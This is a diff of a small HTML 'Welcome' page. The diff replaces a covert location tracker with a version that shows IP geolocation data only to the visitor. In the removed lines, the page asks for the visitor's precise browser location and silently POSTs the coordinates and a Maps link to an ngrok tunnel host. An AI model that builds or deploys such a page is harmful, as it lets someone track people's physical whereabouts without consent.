@@ -1,80 +1,96 @@
 <!DOCTYPE html>
-<html lang="en-EN">
-
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Welcome</title>
   <link rel="stylesheet" href="styles.css" />
+  <style>
+    body {
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+    }
+    .comprovante-container {
+      margin: 20px;
+      padding: 20px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+    .geolocation-details {
+      padding: 15px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      margin-top: 15px;
+    }
+    .geolocation-details p {
+      margin: 5px 0;
+      font-size: 0.9em;
+    }
+    .geolocation-details h2 {
+      margin-top: 0;
+    }
+  </style>
 </head>
-
 <body>
   <div class="comprovante-container">
     <h1>Welcome</h1>
 
     <div class="informacoes">
-      <p><span>Data:</span> <span id="data-atual"></span></p>
+      <p><strong>Date:</strong> <span id="data-atual"></span></p>
+    </div>
+
+    <div class="geolocation-details">
+      <h2>Geolocation Information</h2>
+      <p><strong>IP:</strong> <span id="geo-ip">Loading...</span></p>
+      <p><strong>City:</strong> <span id="geo-city">Loading...</span></p>
+      <p><strong>Region:</strong> <span id="geo-region">Loading...</span> (<span id="geo-region-code">Loading...</span>)</p>
+      <p><strong>Country:</strong> <span id="geo-country">Loading...</span> (<span id="geo-country-code">Loading...</span>)</p>
+      <p><strong>Postal Code:</strong> <span id="geo-postal">Loading...</span></p>
+      <p><strong>Latitude:</strong> <span id="geo-latitude">Loading...</span></p>
+      <p><strong>Longitude:</strong> <span id="geo-longitude">Loading...</span></p>
+      <p><strong>Timezone:</strong> <span id="geo-timezone">Loading...</span></p>
+      <p><strong>Calling Code:</strong> <span id="geo-calling-code">Loading...</span></p>
+      <p><strong>ASN:</strong> <span id="geo-asn">Loading...</span></p>
+      <p><strong>Organization:</strong> <span id="geo-org">Loading...</span></p>
     </div>
 
     <button class="botao" onclick="window.print()">Print</button>
-
-    <div class="comprovante-footer">
-      <p>NVM.</p>
-      <p><a href="#">Click here</a> for more info.</p>
-    </div>
 
   </div>
 
   <script>
     window.addEventListener("load", () => {
-      // display user agent
-      document.getElementById("user-agent").textContent = navigator.userAgent;
+      // Set and display the current date
+      const now = new Date();
+      const dia = String(now.getDate()).padStart(2, '0');
+      const mes = String(now.getMonth() + 1).padStart(2, '0');
+      const ano = now.getFullYear();
+      document.getElementById("data-atual").textContent = `${dia}/${mes}/${ano}`;
 
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-      } else {
-        alert("Something went wrong...try again later.");
-      }
-    });
-
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-
-    document.getElementById("data-atual").textContent = dataFormatada;
-
-    console.log(dataAtual)
-
-    function sendLocation(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-      fetch("https://bffd-212-51-128-217.ngrok-free.app/send-location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude, maps })
-      })
+      // Fetch geolocation data from ipapi.co, which supports CORS
+      fetch("https://ipapi.co/json/")
         .then(response => response.json())
         .then(data => {
-          if (!data.success) {
-            alert("Error sending confirmation.");
-          }
+          document.getElementById("geo-ip").textContent = data.ip;
+          document.getElementById("geo-city").textContent = data.city;
+          document.getElementById("geo-region").textContent = data.region;
+          document.getElementById("geo-region-code").textContent = data.region_code;
+          document.getElementById("geo-country").textContent = data.country_name;
+          document.getElementById("geo-country-code").textContent = data.country;
+          document.getElementById("geo-postal").textContent = data.postal;
+          document.getElementById("geo-latitude").textContent = data.latitude;
+          document.getElementById("geo-longitude").textContent = data.longitude;
+          document.getElementById("geo-timezone").textContent = data.timezone;
+          document.getElementById("geo-calling-code").textContent = data.country_calling_code;
+          document.getElementById("geo-asn").textContent = data.asn;
+          document.getElementById("geo-org").textContent = data.org;
         })
         .catch(error => {
-          console.error("Error:", error);
+          console.error("Error fetching geolocation data:", error);
         });
-    }
-
-    function handleError(error) {
-      alert("Error obtaining location: " + error.message);
-    }
+    });
   </script>
 </body>
-
 </html>
